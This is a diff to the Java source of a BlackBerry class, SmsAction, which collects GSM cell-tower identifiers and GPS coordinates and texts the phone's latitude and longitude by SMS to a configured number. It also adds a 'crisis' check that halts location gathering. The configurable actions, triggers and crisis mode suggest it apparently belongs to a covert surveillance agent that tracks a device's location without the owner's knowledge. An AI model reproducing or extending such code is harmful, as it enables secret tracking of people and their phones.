@@ -15,10 +15,12 @@ import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
+import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.Device;
 import blackberry.Messages;
 import blackberry.SMSHelper;
+import blackberry.Status;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
@@ -79,7 +81,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     
             switch (type) {
                 case TYPE_TEXT:
-                    text = params.getString(Messages.getString("9.33")); //$NON-NLS-1$
+                    text = params.getString(Messages.getString("9.33"),"No Text"); //$NON-NLS-1$
                     break;
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
@@ -138,6 +140,8 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
                 case TYPE_LOCATION:
                     // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+                    
+                    
                     if (!getGPSPosition()) {
                         errorLocation(false);
                     }
@@ -172,14 +176,13 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 // http://en.wikipedia.org/wiki/Mobile_Network_Code
                 final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-                final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
-                        .getMCC()));
-
-                final int mnc = cellinfo.getMNC();
+                int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
+                        .getCurrentNetworkIndex()));
+                int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
+                
                 final int lac = cellinfo.getLAC();
                 final int cid = cellinfo.getCellId();
-
-                final int bsic = GPRSInfo.getCellInfo().getBSIC();
+                final int bsic = cellinfo.getBSIC();
 
                 final StringBuffer mb = new StringBuffer();
                 mb.append(Messages.getString("9.3") + mcc); //$NON-NLS-1$
@@ -232,6 +235,20 @@ public final class SmsAction extends SubAction implements LocationObserver {
             return false;
         }
 
+        if (Status.self().crisisPosition()) {
+            //#ifdef DEBUG
+            debug.trace("locationGPS: crisis"); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+
+        if (!Device.getInstance().hasGPS()) {
+            //#ifdef DEBUG
+            debug.error("locationGPS: doesn't have GPS"); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+        
         synchronized (this) {
             LocationHelper.getInstance().start(this, true);
         }
@@ -240,33 +257,39 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     public void newLocation(Location loc) {
-        //#ifdef DEBUG
-        debug.trace("newLocation"); //$NON-NLS-1$
-        //#endif
-
-        if (loc == null) {
+        try{
             //#ifdef DEBUG
-            debug.error("Error in getLocation"); //$NON-NLS-1$
-            //#endif  
-            return;
-        }
-
-        final float speed = loc.getSpeed();
-        final float course = loc.getCourse();
-
-        final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
-        if (qc == null) {
+            debug.trace("newLocation"); //$NON-NLS-1$
+            //#endif
+    
+            if (loc == null) {
+                //#ifdef DEBUG
+                debug.error("Error in getLocation"); //$NON-NLS-1$
+                //#endif  
+                return;
+            }
+    
+            final float speed = loc.getSpeed();
+            final float course = loc.getCourse();
+    
+            final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
+            if (qc == null) {
+                //#ifdef DEBUG
+                debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
+                //#endif                        
+                errorLocation(false);
+            }else{
+                final StringBuffer sb = new StringBuffer();
+                sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+                sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
+        
+                sendSMS(sb.toString());
+            }
+        }catch(Exception ex){
             //#ifdef DEBUG
-            debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
-            //#endif                        
-            errorLocation(false);
+            debug.error("newLocation: " + ex);
+            //#endif
         }
-
-        final StringBuffer sb = new StringBuffer();
-        sb.append(Messages.getString("9.16") + qc.getLatitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
-        sb.append(Messages.getString("9.18") + qc.getLongitude() + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
-
-        sendSMS(sb.toString());
 
     }
 
@@ -313,7 +336,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
             debug.trace("sendSMS: Text"); //$NON-NLS-1$
             //#endif
             if (Device.isSimEnabled()) {
-                ret = SMSHelper.sendSMSDatagram(number, message);
+                ret = SMSHelper.sendSMSText(number, message);
             } else {
                 //#ifdef DEBUG
                 debug.error("sendSMS: sim not enabled"); //$NON-NLS-1$
@@ -326,6 +349,10 @@ public final class SmsAction extends SubAction implements LocationObserver {
         } else {
 
         }
+        
+        //#ifdef DEBUG
+        debug.trace("sendSMS end");
+        //#endif
         return ret;
     }
 
